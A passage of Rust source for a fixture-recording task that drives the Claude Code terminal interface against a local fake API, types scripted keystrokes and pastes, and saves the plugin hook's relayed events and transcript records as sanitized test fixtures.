        let host_len = host.find(|c: char| !domain(c)).unwrap_or(host.len());
        let host_part = host.get(..host_len).unwrap_or_default().trim_end_matches('.');
        if user_len > 0 && host_part.contains('.') {
            out.push_str(before.get(..user_start).unwrap_or_default());
            out.push_str("user@example.com");
            rest = host.get(host_part.len()..).unwrap_or_default();
        } else {
            out.push_str(before);
            out.push('@');
            rest = host;
        }
    }
    out.push_str(rest);
    out
}

/// The acts `fixtures claude-mod` types, each with the keys it sends and the pause after it.
/// Keys go one at a time, 120 ms apart, as a person types; a bracketed paste goes whole.
const MOD_ACTS: &[(&str, &[&str], u64)] = &[
    ("typed", &["h", "e", "l", "l", "o"], 700),
    ("backspace", &["\x7f"], 700),
    ("short paste", &["\x1b[200~ one\ntwo\x1b[201~"], 700),
    ("long paste", &["\x1b[200~a\nb\nc\nd\ne\nf\x1b[201~"], 700),
    ("image", &["\x1b[200~IMAGE\x1b[201~"], 900),
    ("caret", &["\x1b[D", "\x1b[D"], 700),
    ("clear", &["\x1b", "\x1b"], 900),
    ("recall", &["\x1b[A"], 700),
    ("back", &["\x1b[B"], 700),
    ("submit", &["s", "c", "e", "n", "a", "r", "i", "o", ":", "h", "o", "l", "d", "\r"], 1200),
    ("queue", &["q", "u", "e", "u", "e", "d", "\r"], 1000),
    ("pull back", &["\x1b[A"], 700),
    ("queue again", &["\r"], 12_000),
    ("ask", &["s", "c", "e", "n", "a", "r", "i", "o", ":", "a", "s", "k", "\r"], 3000),
    ("dialog keys", &["z", "q"], 900),
    ("decline", &["\x1b"], 3000),
];

/// A 1 × 1 PNG, the picture the recording pastes.
const PIXEL_PNG: &str = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==";

/// `cargo xtask fixtures claude-mod`: the official TUI in a pseudo-terminal, in a scratch home
/// with a placeholder key, against the canned API; the embedded mod relays to this binary
/// (`claude-mod sink`). Written: what each act relayed (`drafts.jsonl`), the transcript's
/// queue and prompt records (`queue.jsonl`), where the pasted picture was stored
/// (`store.json`), and the version and module recorded with.
fn record_mod() -> Result<()> {
    use crate::claude_mod::{MOD, Scratch, Tui, pause, until};
    let version = crate::claude::VERSION;
    let claude = crate::claude::official(version)?;
    let root = repo_root()?.into_std_path_buf();
    let out = root.join("crates/slopty-agent/tests/fixtures/claude-mod");
    let scratch = Scratch::new("record")?;
    let api = crate::canned::FakeApi::start()?;
    let sink = scratch.root.join("relayed.jsonl");
    let module = std::fs::read_to_string(root.join(MOD).join("hooks/register.ts"))?;
    let exe = std::env::current_exe()?;
    let relay = json!([exe.to_string_lossy(), "claude-mod", "sink", sink.to_string_lossy()]);
    let relayed_module = module.replace("['/slopty', 'hook']", &relay.to_string());
    ensure!(relayed_module != module, "the mod's module names no relay to replace");
    let plugin = scratch.root.join("mod");
    for part in [".claude-plugin/plugin.json", "hooks/hooks.json"] {
        let to = plugin.join(part);
        std::fs::create_dir_all(to.parent().context("a file in a folder")?)?;
        std::fs::copy(root.join(MOD).join(part), &to)?;
    }
    std::fs::write(plugin.join("hooks/register.ts"), relayed_module)?;
    let picture = scratch.work.join("pixel.png");
    std::fs::write(&picture, data_encoding::BASE64.decode(PIXEL_PNG.as_bytes())?)?;
    let debug = scratch.root.join("debug.log");
    let mut command = scratch.claude(&claude);
    command
        .env("ANTHROPIC_BASE_URL", format!("http://127.0.0.1:{}", api.port))
        // The dialog the recording types at: auto mode would let the call run unasked.
        .args(["--permission-mode", "default"])
        .arg("--plugin-dir")
        .arg(&plugin)
        .arg("--debug-file")
        .arg(&debug);
    let tui = Tui::start(command)?;
    let loaded = until(Duration::from_secs(60), || {
        std::fs::read_to_string(&debug)
            .is_ok_and(|log| log.contains("hooks module slopty@inline loaded"))
    });
    ensure!(loaded, "the mod did not load in 60 s:\n{}", tui.screen_text());
    // The box draws a moment after the modules load.
    pause(Duration::from_secs(3));
    let mut marks = Vec::new();
    for &(act, keys, rest_ms) in MOD_ACTS {
        marks.push((act, now_ms()));
        for key in keys {
            let key = key.replace("IMAGE", &picture.to_string_lossy());
            tui.send(key.as_bytes())?;
            pause(Duration::from_millis(120));
        }
        pause(Duration::from_millis(rest_ms));
    }
    let screen = tui.screen_text();
    tui.send(b"\x03")?;
    pause(Duration::from_millis(300));
    tui.send(b"\x03")?;
    pause(Duration::from_secs(1));
    tui.stop();
    let relays: Vec<Value> = std::fs::read_to_string(&sink)
        .unwrap_or_default()
        .lines()
        .filter_map(|l| serde_json::from_str(l).ok())
        .collect();
    ensure!(!relays.is_empty(), "the mod relayed nothing; the screen:\n{screen}");
    let mut sessions: Vec<String> = Vec::new();
    let mut session_name = |id: &str| {
        let at = sessions.iter().position(|s| s == id).unwrap_or_else(|| {
            sessions.push(id.to_owned());
            sessions.len().saturating_sub(1)
        });
        format!("session-{}", at.saturating_add(1))
    };
    let mut drafts = String::new();
    for relay in &relays {
        let at = relay.get("at_ms").and_then(Value::as_u64).unwrap_or(0);
        let act = marks.iter().rev().find(|(_, m)| *m <= at).map_or("start", |(a, _)| a);
        let mut payload = relay.get("payload").cloned().unwrap_or(Value::Null);
        if let Some(fields) = payload.as_object_mut()
            && let Some(id) = fields.get("session_id").and_then(Value::as_str).map(str::to_owned)
        {
            fields.insert("session_id".to_owned(), Value::from(session_name(&id)));
        }
        drafts.push_str(&json!({ "act": act, "payload": payload }).to_string());
        drafts.push('\n');
    }
    // The transcript's queue and the prompts it delivered, in order.
    let mut queue = String::new();
    let first = sessions.first().cloned().context("no session relayed")?;
    let escaped: String = scratch
        .work
        .to_string_lossy()
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '-' })
        .collect();
    let transcript =
        scratch.home.join(".claude/projects").join(&escaped).join(format!("{first}.jsonl"));
    let records = std::fs::read_to_string(&transcript)
        .with_context(|| format!("read {}", transcript.display()))?;
    for record in records.lines().filter_map(|l| serde_json::from_str::<Value>(l).ok()) {
        let kind = record.get("type").and_then(Value::as_str).unwrap_or_default();
        let kept = match kind {
            "queue-operation" => json!({
                "type": kind,
                "operation": record.get("operation"),
                "content": record.get("content"),
            }),
            "user" if record.get("isMeta").is_none() => {
                let content = record.pointer("/message/content");
                let text = match content {
                    Some(Value::String(s)) => s.clone(),
                    Some(Value::Array(parts)) => {
                        parts.iter().filter_map(|p| p.get("text").and_then(Value::as_str)).collect()
                    }
                    _ => continue,
                };
                if text.is_empty() {
                    continue;
                }
                json!({ "type": kind, "text": text })
            }
            _ => continue,
        };
        queue.push_str(&kept.to_string());
        queue.push('\n');
    }
    // Where Claude Code stored the pasted picture, below its temporary root.
    let tmp = std::fs::canonicalize(scratch.root.join("tmp"))?;
    let mut images = Vec::new();
    let mut stack = vec![tmp.clone()];
    while let Some(dir) = stack.pop() {
        for entry in std::fs::read_dir(&dir).into_iter().flatten().flatten() {
            let path = entry.path();
            if path.is_dir() {
                stack.push(path);
            } else if path.parent().is_some_and(|p| p.ends_with("images")) {
                let relative =
                    path.strip_prefix(&tmp)?.to_string_lossy().replace(&first, "session-1");
                images.push(relative);
            }
        }
    }
    ensure!(!images.is_empty(), "Claude Code stored no pasted picture under {}", tmp.display());
    let store = json!({
        "cwd": scratch.work.to_string_lossy(),
        "uid": rustix::process::getuid().as_raw(),
        "images": images,
    });
    std::fs::create_dir_all(&out)?;
    std::fs::write(out.join("version"), format!("{version}\n"))?;
    std::fs::write(out.join("register.ts"), &module)?;
    std::fs::write(out.join("drafts.jsonl"), drafts)?;
    std::fs::write(out.join("queue.jsonl"), queue)?;
    std::fs::write(out.join("store.json"), format!("{store:#}\n"))?;
    println!(
        "recorded {} relays, {} sessions, into {}",
        relays.len(),
        sessions.len(),
        out.display()
    );
    Ok(())
}

/// Milliseconds since the epoch, as the sink stamps them.
fn now_ms() -> u64 {
    SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .map_or(0, |d| u64::try_from(d.as_millis()).unwrap_or(u64::MAX))
}
